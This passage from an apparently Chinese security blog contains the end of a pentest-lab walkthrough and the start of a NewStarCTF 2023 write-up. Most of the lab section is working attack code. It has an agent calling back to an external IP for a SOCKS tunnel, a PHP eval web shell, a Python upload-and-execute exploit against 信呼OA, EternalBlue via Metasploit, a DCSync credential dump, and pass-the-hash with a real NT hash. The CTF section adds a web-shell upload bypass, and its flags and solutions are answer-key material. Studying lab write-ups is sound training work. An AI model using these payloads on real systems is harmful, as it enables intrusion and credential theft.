class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l 1234 -s 123</span><br><span class="line"></span><br><span class="line">./linux_x64_agent -c 156.238.233.93:1234 -s 123 --reconnect 8</span><br><span class="line"></span><br><span class="line">use 0</span><br><span class="line">socks 5555</span><br></pre></td></tr></table></figure><p>现在我们就搭建好了socks5的代理了，使用<code>proxifier</code>弄一个全局代理</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/2.png" alt="1"></p><p>信呼OA这个系统刚好版本也是可以用NDAY打的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>)</span><br><span class="line"><span class="built_in">print</span>(filepath)</span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?a=system(&#x27;dir&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功getshell，得到flag2，权限足够，新建一个用户登录上去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user test1 baozongwi123! /add</span><br><span class="line">net localgroup administrators test1 /add</span><br></pre></td></tr></table></figure><p>并不是域用户，接着去打永恒之蓝，先在kali弄好socks代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim /etc/proxychains4.conf</span><br><span class="line"></span><br><span class="line">socks5 156.238.233.93 5555</span><br></pre></td></tr></table></figure><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>利用msf攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br><span class="line">shell</span><br><span class="line">chcp 65001</span><br><span class="line"></span><br><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p>本来想的是直接新建用户上去的，但是发现一个问题，就是链接之后直接蓝屏了（忘记了）</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/3.png" alt="1"></p><p>确认是域用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看域管理员</span></span><br><span class="line">net group <span class="string">&quot;Domain Admins&quot;</span> /domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看企业管理员  </span></span><br><span class="line">net group <span class="string">&quot;Enterprise Admins&quot;</span> /domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看域控制器</span></span><br><span class="line">net group <span class="string">&quot;Domain Controllers&quot;</span> /domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有域计算机</span></span><br><span class="line">net group <span class="string">&quot;Domain Computers&quot;</span> /domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看域信息</span></span><br><span class="line">nltest /domain_trusts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看域控制器详细信息</span></span><br><span class="line">nslookup DC01.xiaorang.lab</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前机器在域中的状态</span></span><br><span class="line">nltest /sc_query:xiaorang.lab</span><br></pre></td></tr></table></figure><p>上传sharphound收集信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> /home/kali/桌面/Pentest/BloodHound-linux-x64/resources/app/Collectors/SharpHound.exe /tmp/SharpHound.exe</span><br><span class="line">upload /tmp/SharpHound.exe C:\\Windows\\temp\\SharpHound.exe</span><br><span class="line"></span><br><span class="line">shell</span><br><span class="line"><span class="built_in">cd</span> C:\Windows\temp</span><br><span class="line">SharpHound.exe -c all</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">download C:\\Windows\\Temp\\20250617200323_BloodHound.zip /tmp/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以下载到你的工作目录</span></span><br><span class="line">download C:\\Windows\\Temp\\20250617200323_BloodHound.zip /home/kali/桌面/</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/4.png" alt="1"></p><p>查看当前用户与域的关系</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/5.png" alt="1"></p><blockquote><p>The computer XIAORANG-WIN7.XIAORANG.LAB has the DS-Replication-Get-Changes-All permission on the domain XIAORANG.LAB.</p><p>计算机 XIAORANG-WIN7.XIAORANG.LAB 对域 XIAORANG.LAB 具有 DS-Replication-Get-Changes-All 权限。</p><p>Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes, a principal may perform a DCSync attack.</p><p>单独而言，此边缘不授予执行攻击的能力。但是，与 DS-Replication-Get-Changes 结合使用时，委托人可以执行 DCSync 攻击。</p><p>The computer XIAORANG-WIN7.XIAORANG.LAB has the DS-Replication-Get-Changes permission on the domain XIAORANG.LAB.</p><p>计算机 XIAORANG-WIN7.XIAORANG.LAB 对域 XIAORANG.LAB 具有 DS-Replication-Get-Changes 权限。</p><p>Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes-All, a principal may perform a DCSync attack.</p><p>单独而言，此边缘不授予执行攻击的能力。但是，与 DS-Replication-Get-Changes-All 结合使用时，委托人可以执行 DCSync 攻击。</p></blockquote><p>所以可以利用这个用户进行 DCSync攻击，现在需要获得<code>NThash</code></p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/PixPin_2025-08-09_22-28-25.png" alt="1"></p><blockquote><p>When a user authenticates to a computer, they often leave credentials exposed on the system, which can be retrieved through LSASS injection, token manipulation&#x2F;theft, or injecting into a user’s process.<br>当用户向计算机进行身份验证时，他们通常会在系统上公开凭据，这些凭据可以通过 LSASS 注入、令牌作&#x2F;盗窃或注入用户进程来检索。</p></blockquote><p>所以可以利用猕猴桃获得管理员的<code>NThash</code>，但是我们不用传猕猴桃，因为有msf会话，可以直接使用其中的模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/6.png" alt="1"></p><p>再直接横向即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-wmiexec xiaorang.lab/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8 -codec gbk</span><br><span class="line"><span class="built_in">type</span> Users\Administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">thinkphp5.0.23RCE、MS17-010、DCSync</summary>
    
    
    
    <category term="春秋云镜" scheme="https://baozongwi.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    
    
    <category term="Pentest" scheme="https://baozongwi.xyz/tags/Pentest/"/>
    
  </entry>
  
  <entry>
    <title>NewStarCTF 2023 公开赛道</title>
    <link href="https://baozongwi.xyz/posts/12220.html"/>
    <id>https://baozongwi.xyz/posts/12220.html</id>
    <published>2025-08-08T13:00:15.000Z</published>
    <updated>2025-08-09T14:06:19.997Z</updated>
    
    <content type="html"><![CDATA[<h2 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h2><p>访问<code>www.zip</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous&#125;</span><br></pre></td></tr></table></figure><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">validateForm</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> fileInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> file = fileInput.<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> allowedExtensions = [<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>];</span><br><span class="line">        <span class="keyword">var</span> fileExtension = file.<span class="property">name</span>.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="title function_">pop</span>().<span class="title function_">toLowerCase</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;Please select a file to upload.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!allowedExtensions.<span class="title function_">includes</span>(fileExtension)) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;错误的拓展名，只允许上传: JPG, JPEG, PNG, GIF&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这里的拓展名是包含即可不会管位置</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>41c86846-3bf2-4883-863f-ffaf0ddd3de2.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>307</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://41c86846-3bf2-4883-863f-ffaf0ddd3de2.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarysNiLt38cRoeUSc87</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://41c86846-3bf2-4883-863f-ffaf0ddd3de2.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysNiLt38cRoeUSc87</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;1.jpg.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysNiLt38cRoeUSc87</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">Upload!!!</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysNiLt38cRoeUSc87--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?ctf=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node5.buuoj.cn:27312</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>NewStarCTF2023</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>newstarctf.com</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">X-Real-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>power=ctfer</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">secret</span><span class="operator">=</span>n3wst4rCTF2023g00000d</span></span><br></pre></td></tr></table></figure><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p>测试不是SSTI，报错出了flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?number1=1&amp;number2=3=1</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/newstar2023/PixPin_2025-08-08_21-15-24.png"></p><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><p>经典的弱比较问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 1=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$flag1</span> = True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 2=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$flag2</span> = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 3=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$flag3</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag3</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 4=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>] &gt; <span class="number">2023</span>)&#123;</span><br><span class="line">            <span class="variable">$flag4</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 4&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 5=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>放点资料，就不说了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$md5 md5($md5)</span><br><span class="line">s878926199a0e545993274517709034328855841020</span><br><span class="line">s155964671a0e342768416822451524974117254469</span><br><span class="line">s214587387a0e848240448830537924465865611904</span><br><span class="line">s214587387a0e848240448830537924465865611904</span><br><span class="line">s878926199a0e545993274517709034328855841020</span><br><span 